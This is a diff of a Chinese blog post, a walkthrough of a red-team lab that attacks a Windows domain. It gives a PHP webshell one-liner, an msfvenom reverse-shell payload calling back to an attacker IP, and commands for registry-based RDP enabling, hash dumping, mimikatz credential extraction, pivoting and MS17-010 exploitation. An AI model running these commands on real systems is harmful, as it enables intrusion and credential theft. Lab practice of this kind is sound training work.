+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.6.jpg" srcset="/img/loading.gif" lazyload class="">
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.9.jpg" srcset="/img/loading.gif" lazyload class="">
 <p>5、通过蚁剑连接，密码：whoami，另外要选择编码方式</p>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.16.jpg" srcset="/img/loading.gif" lazyload alt="1.16"></p>
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.16.jpg" srcset="/img/loading.gif" lazyload class="">
 <p>注：另一种连接方法为另写一个shell.php文件，内容为“<?php @eval($_POST["123"]);?>”，则连接密码为123，但是这种登录方式在下面的信息搜集过程中会出问题。</p>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.7.jpg" srcset="/img/loading.gif" lazyload alt="1.7"></p>
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.7.jpg" srcset="/img/loading.gif" lazyload class="">
 <h1>进入内网</h1>
 <h2 id="信息搜集">信息搜集</h2>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.17.jpg" srcset="/img/loading.gif" lazyload alt="1.17"></p>
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.17.jpg" srcset="/img/loading.gif" lazyload class="">
 <figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span>	<span class="hljs-title">查看本机用户列表</span><br></code></pre></td></tr></table></figure>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.18.jpg" srcset="/img/loading.gif" lazyload alt="1.18"></p>
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.18.jpg" srcset="/img/loading.gif" lazyload class="">
 <figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">/domain</span>	查看域用户<br></code></pre></td></tr></table></figure>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.19.jpg" srcset="/img/loading.gif" lazyload alt="1.19"></p>
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.19.jpg" srcset="/img/loading.gif" lazyload class="">
 <figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> localgroup administrators	查看本地管理员组（通常会有域用户）<br></code></pre></td></tr></table></figure>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.20.jpg" srcset="/img/loading.gif" lazyload alt="1.20"></p>
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.20.jpg" srcset="/img/loading.gif" lazyload class="">
 <figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">/doamin</span>	查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）<br></code></pre></td></tr></table></figure>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.21.jpg" srcset="/img/loading.gif" lazyload alt="1.21"></p>
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.21.jpg" srcset="/img/loading.gif" lazyload class="">
 <figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;domain</span> computers<span class="hljs-string">&quot; /domain	查看域中的其他主机名</span><br></code></pre></td></tr></table></figure>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.22.jpg" srcset="/img/loading.gif" lazyload alt="1.22"></p>
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.22.jpg" srcset="/img/loading.gif" lazyload class="">
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">net <span class="hljs-keyword">group</span> &quot;domain admins&quot; /<span class="hljs-keyword">domain</span>	查看域管理员的名字<br>net <span class="hljs-keyword">group</span> &quot;domain controllers&quot; /<span class="hljs-keyword">domain</span>	查看域控制器（可能有多台）<br></code></pre></td></tr></table></figure>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.23.jpg" srcset="/img/loading.gif" lazyload alt="1.23"></p>
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.23.jpg" srcset="/img/loading.gif" lazyload class="">
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">route <span class="hljs-built_in">print</span>	路由信息<br></code></pre></td></tr></table></figure>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.24.jpg" srcset="/img/loading.gif" lazyload alt="1.24"></p>
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.24.jpg" srcset="/img/loading.gif" lazyload class="">
 <p><strong>收集到的关键信息</strong>：<a target="_blank" rel="noopener" href="http://xn--god-c88d89xw6fun0i.org">该域名为god.org</a>，域控为<code>OWA$</code>，域管理员为<code>Administrator</code>，内网网段为192.168.52.1/24，我们用Ping命令探测域控的ip→可知域控ip为192.168.52.138</p>
 <figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-built_in">ping</span> owa.god<span class="hljs-meta">.org</span><br></code></pre></td></tr></table></figure>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.25.jpg" srcset="/img/loading.gif" lazyload alt="1.25"></p>
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.25.jpg" srcset="/img/loading.gif" lazyload class="">
 <h2 id="添加组成员">添加组成员</h2>
 <p>在win7本地主机创建一个whoami用户，并加入到管理员组中</p>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.26.jpg" srcset="/img/loading.gif" lazyload alt="1.26"></p>
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.26.jpg" srcset="/img/loading.gif" lazyload class="">
 <h2 id="远程准备">远程准备</h2>
 <p>然后设法远程桌面登录，查看3389是否开启：</p>
 <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">netstat -ano | find <span class="hljs-string">&quot;3389&quot;</span><br>若未开启：<br>REG <span class="hljs-keyword">ADD</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></code></pre></td></tr></table></figure>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.27.jpg" srcset="/img/loading.gif" lazyload alt="1.27"></p>
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.27.jpg" srcset="/img/loading.gif" lazyload class="">
 <h2 id="kali生成shell-exe">kali生成shell.exe</h2>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/haqiang555/article/details/102676735">https://blog.csdn.net/haqiang555/article/details/102676735</a></p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">(msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=你kali的IP <span class="hljs-attribute">LPORT</span>=随便一个端口 -f exe -o shell.exe)<br>msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.254.132 <span class="hljs-attribute">LPORT</span>=4444 -f exe -o shell.exe<br></code></pre></td></tr></table></figure>
-<img src="ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.28.jpg" srcset="/img/loading.gif" lazyload alt="1.28" style="zoom:67%;" />
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.28.jpg" srcset="/img/loading.gif" lazyload class="">
 <p>利用蚁剑上传到win7：</p>
-<img src="ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.29.jpg" srcset="/img/loading.gif" lazyload alt="1.29" style="zoom:67%;" />
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.29.jpg" srcset="/img/loading.gif" lazyload class="">
 <h2 id="监听">监听</h2>
 <figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-number">1</span>、启动msfconsole：msfconsole<br><span class="hljs-number">2</span>、开启监听：use exploit/multi/handler<br><span class="hljs-number">3</span>、设置tcp监听：<span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br>4、<span class="hljs-keyword">set</span> <span class="hljs-comment">lhost 192.168.254.132</span><br>5、开始监听：exploit<br>6、运行shell.exe<br></code></pre></td></tr></table></figure>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.31.jpg" srcset="/img/loading.gif" lazyload alt="1.31"></p>
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.31.jpg" srcset="/img/loading.gif" lazyload class="">
 <p>成功上线</p>
 <h2 id="提权">提权</h2>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.32.jpg" srcset="/img/loading.gif" lazyload alt="1.32"></p>
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.32.jpg" srcset="/img/loading.gif" lazyload class="">
 <p>关闭防火墙：</p>
 <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">run</span><span class="language-bash"> post/windows/manage/enable_rdp</span><br></code></pre></td></tr></table></figure>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.33.jpg" srcset="/img/loading.gif" lazyload alt="1.33"></p>
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.33.jpg" srcset="/img/loading.gif" lazyload class="">
 <p>打开远程桌面：</p>
 <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">rdestokpot</span> <span class="hljs-number">192.168.254.130</span><br></code></pre></td></tr></table></figure>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.34.jpg" srcset="/img/loading.gif" lazyload alt="1.34"></p>
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.34.jpg" srcset="/img/loading.gif" lazyload class="">
 <p>抓hash：</p>
 <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">meterpreter</span> &gt; hashdump<br></code></pre></td></tr></table></figure>
 <p>若失败，则用msf自带的模块进行hash抓取</p>
 <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">meterpreter &gt; <span class="hljs-keyword">run</span><span class="language-bash"> post/windows/gather/smart_hashdump</span><br></code></pre></td></tr></table></figure>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.35.jpg" srcset="/img/loading.gif" lazyload alt="1.35"></p>
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.35.jpg" srcset="/img/loading.gif" lazyload class="">
 <p>加载mimikatz模块：</p>
 <figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">meterpreter &gt; <span class="hljs-keyword">load</span> mimikatz<br></code></pre></td></tr></table></figure>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.36.jpg" srcset="/img/loading.gif" lazyload alt="1.36"></p>
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.36.jpg" srcset="/img/loading.gif" lazyload class="">
 <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">kiwi_cmd</span> privilege::<span class="hljs-literal">debug</span>	进行权限提升<br></code></pre></td></tr></table></figure>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.37.jpg" srcset="/img/loading.gif" lazyload alt="1.37"></p>
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.37.jpg" srcset="/img/loading.gif" lazyload class="">
 <figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">kiwi_cmd sekurlsa::logonPasswords<br></code></pre></td></tr></table></figure>
-<p>报错，解决：进程迁移<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41453632/article/details/84726947">(41条消息) Metasploit（进程迁移）_毕竟话少的博客-CSDN博客_进程迁移</a></p>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.38.jpg" srcset="/img/loading.gif" lazyload alt="1.38"></p>
+<p>报错，解决：进程迁移</p>
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.38.jpg" srcset="/img/loading.gif" lazyload class="">
 <figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript">getpid   当前pid<br>ps   查看所有进程<span class="hljs-built_in">id</span><br>migrate xxx(某个系统进程的<span class="hljs-built_in">id</span>)    进程迁移<br>再次执行：kiwi_cmd sekurlsa::logonPasswords<br></code></pre></td></tr></table></figure>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.39.jpg" srcset="/img/loading.gif" lazyload alt="1.39"></p>
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.39.jpg" srcset="/img/loading.gif" lazyload class="">
 <p>此时我们已经获取到了administrator（域管理员）的明文密码——Liu78963</p>
 <h1>横向移动</h1>
 <p>进一步渗透入内网，对域中的其他主机进行渗透</p>
 <p>1、探测内网存活主机</p>
 <p>（在kali的远程控制桌面下执行，以下为windows命令）</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span> /L %I in (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">254</span>) DO @ping -w <span class="hljs-number">1</span> -n <span class="hljs-number">1</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">52</span>.%I | findstr <span class="hljs-string">&quot;TTL=&quot;</span>   用Ping命令探测内网主机<br></code></pre></td></tr></table></figure>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.40.jpg" srcset="/img/loading.gif" lazyload alt="1.40"></p>
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.40.jpg" srcset="/img/loading.gif" lazyload class="">
 <p>探测到一台内网主机，ip为192.168.52.141。我们添加一下路由，对该主机进行渗透</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> autoroute -s 192.168.52.0/24<br><span class="hljs-built_in">run</span> autoroute -p<br>background<br></code></pre></td></tr></table></figure>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.41.jpg" srcset="/img/loading.gif" lazyload alt="1.41"></p>
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.41.jpg" srcset="/img/loading.gif" lazyload class="">
 <p>探测是否存在ms17_010：</p>
 <figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">use</span> auxiliary/scanner/smb/smb_ms17_010<br><span class="hljs-keyword">set</span> rhosts 192.168.52.141<br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.42.jpg" srcset="/img/loading.gif" lazyload alt="1.42"></p>
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.42.jpg" srcset="/img/loading.gif" lazyload class="">
 <p>发现存在漏洞，尝试攻击</p>
 <p>报错：[-] 192.168.52.141:445 - Exploit aborted due to failure: no-target: This module only supports x64 (64-bit) targets</p>
 <p>使用模块1：use 1</p>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.43.jpg" srcset="/img/loading.gif" lazyload alt="1.43"></p>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.44.jpg" srcset="/img/loading.gif" lazyload alt="1.44"></p>
-
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.43.jpg" srcset="/img/loading.gif" lazyload class="">
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.44.jpg" srcset="/img/loading.gif" lazyload class="">
                 
               </div>
             
             <hr/>
             <div>
               <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA/" class="category-chain-item">红队靶场</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
   
   
 </div>
@@ -390,9 +403,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/02/24/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA2/" title="">
+                      <a href="/2024/02/24/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/" title="ATT&amp;CK红队评估实战靶场4">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile"></span>
+                        <span class="hidden-mobile">ATT&amp;CK红队评估实战靶场4</span>
                         <span class="visible-mobile">Vorheriger</span>
                       </a>
                     
